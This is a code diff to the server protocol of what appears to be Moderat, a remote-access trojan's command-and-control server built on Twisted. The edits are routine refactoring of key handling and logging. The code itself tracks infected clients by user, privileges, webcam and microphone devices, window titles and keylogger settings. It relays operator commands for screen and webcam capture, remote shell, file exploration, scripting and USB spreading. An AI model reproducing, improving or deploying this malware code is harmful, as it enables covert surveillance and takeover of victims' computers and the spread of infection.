@@ -61,10 +61,11 @@ class ModeratServerProtocol(LineReceiver):
         except SyntaxError:
             return
 
-        self.payload = command['payload']
-        self.mode = command['mode']
-        self.sessionID = command['session_id']
-        self.moduleID = command['module_id']
+        self.payload = command['payload'] if command.has_key('payload') else ''
+        self.mode = command['mode'] if command.has_key('mode') else ''
+        self.sessionID = command['session_id'] if command.has_key('session_id') else ''
+        self.moduleID = command['module_id'] if command.has_key('module_id') else ''
+        self.clientKey = command['key'] if command.has_key('key') else ''
 
         if command['from'] == 'client':
             self.clientCommands()
@@ -97,16 +98,17 @@ class ModeratServerProtocol(LineReceiver):
             self.factory.database.setClientStatus(client_id, True)
 
         elif self.mode == 'infoChecker':
-            protocol = self.factory.clients[self.payload['key']]['protocol']
-            self.factory.clients[self.payload['key']] = {
-                'ip_address': ipAddress, 'os_type': self.payload['os_type'], 'os': self.payload['os'],
-                'user': self.payload['user'], 'privileges': self.payload['privileges'],
-                'audio_device': self.payload['audio_device'], 'webcamera_device': self.payload['webcamera_device'],
-                'window_title': self.payload['window_title'], 'key': self.payload['key'],
-                'kts': self.payload['kts'], 'kt': self.payload['kt'], 'ats': self.payload['ats'], 'at': self.payload['at'],
-                'sts': self.payload['sts'], 'std': self.payload['std'], 'st': self.payload['st'], 'usp': self.payload['usp'],
-                'protocol': protocol, 'status': True,
-            }
+            if type(self.payload) is dict:
+                protocol = self.factory.clients[self.payload['key']]['protocol']
+                self.factory.clients[self.payload['key']] = {
+                    'ip_address': ipAddress, 'os_type': self.payload['os_type'], 'os': self.payload['os'],
+                    'user': self.payload['user'], 'privileges': self.payload['privileges'],
+                    'audio_device': self.payload['audio_device'], 'webcamera_device': self.payload['webcamera_device'],
+                    'window_title': self.payload['window_title'], 'key': self.payload['key'],
+                    'kts': self.payload['kts'], 'kt': self.payload['kt'], 'ats': self.payload['ats'], 'at': self.payload['at'],
+                    'sts': self.payload['sts'], 'std': self.payload['std'], 'st': self.payload['st'], 'usp': self.payload['usp'],
+                    'protocol': protocol, 'status': True,
+                }
 
         else:
             self.factory.log.warning('[MALFORMED] Bad Mode [{}] From [{}]'.format(self.mode, self.transport.getPeer()))
@@ -135,14 +137,12 @@ class ModeratServerProtocol(LineReceiver):
         elif self.factory.moderators.has_key(self.sessionID):
             moderator = self.factory.database.getModerator(self.factory.moderators[self.sessionID]['username'])
 
-            # Note Save Mode
             if self.mode == 'saveNote':
                 splitted = self.payload.split('%SPLITTER%')
                 if len(splitted) == 2:
                     client_id, note_body = splitted
                     self.factory.database.setClientNote(client_id, note_body)
 
-            # Get Note
             elif self.mode == 'getNote':
                 self.sendMessage(self, '{}'.format(self.factory.database.getClientNote(self.payload)))
 
@@ -152,11 +152,11 @@ class ModeratServerProtocol(LineReceiver):
                 try:
                     alias_client = alias_data[0]
                     alias_value = u' '.join(alias_data[1:])
-                    self.factory.log.debug('[MODERATOR][{0}] Add Alias ({1}) for ({2})'.format(moderator.username, alias_value,
-                                                                                   ipAddress))
-                    self.factory.database.set_alias(alias_client, alias_value)
+                    self.factory.log.debug('[MODERATOR][{0}] Add Alias ({1}) for ({2})'.format(
+                        moderator.username, alias_value, ipAddress))
+                    self.factory.database.setClientAlias(alias_client, alias_value)
                 except:
-                    self.factory.log.critical('[MALFORMED][{0}] [MODE: {1}]'.format(moderator.username, mode))
+                    self.factory.log.critical('[MALFORMED][{0}] [MODE: {1}]'.format(moderator.username, self.mode))
 
             elif self.mode == 'removeClient':
                 client = self.payload
@@ -307,15 +307,11 @@ class ModeratServerProtocol(LineReceiver):
                 self.factory.log.debug('[MODERATOR][{0}] Moderator ({1}) Removed'.format(
                     moderator.username, self.payload))
 
-            # For Only Administrators
-            elif self.mode in ['terminateClient'] and self.factory.database.get_privs(moderator.username) == 1:
-                self.sendMessage(self.factory.clients[client_key]['protocol'], self.payload)
-
             # Forward To Client
             elif self.mode in ['getScreen', 'getWebcam', 'setLogSettings', 'updateSource', 'p2pMode',
                           'shellMode', 'explorerMode', 'terminateProcess', 'scriptingMode', 'usbSpreading']:
                 try:
-                    self.sendMessage(self.factory.clients[client_key]['protocol'], self.payload)
+                    self.sendMessage(self.factory.clients[self.clientKey]['protocol'], self.payload)
                 except KeyError as e:
                     pass
             else:
@@ -386,12 +382,9 @@ class ModeratServerFactory(ServerFactory):
                     }
                 else:
                     shared_clients[client.identifier] = {
-                        'moderator': moderator.username,
-                        'key': client.identifier,
-                        'alias': client.alias,
-                        'ip_address': client.ip_address,
+                        'moderator': moderator.username, 'key': client.identifier, 'alias': client.alias,
+                        'ip_address': client.ip_address, 'status': client.status,
                         'last_online': client.last_online.strftime("%Y-%m-%d %H:%M:%S"),
-                        'status': client.status
                     }
             self.sendMessage(self.moderators[session]['protocol'], shared_clients, 'getClients', '', '')
 
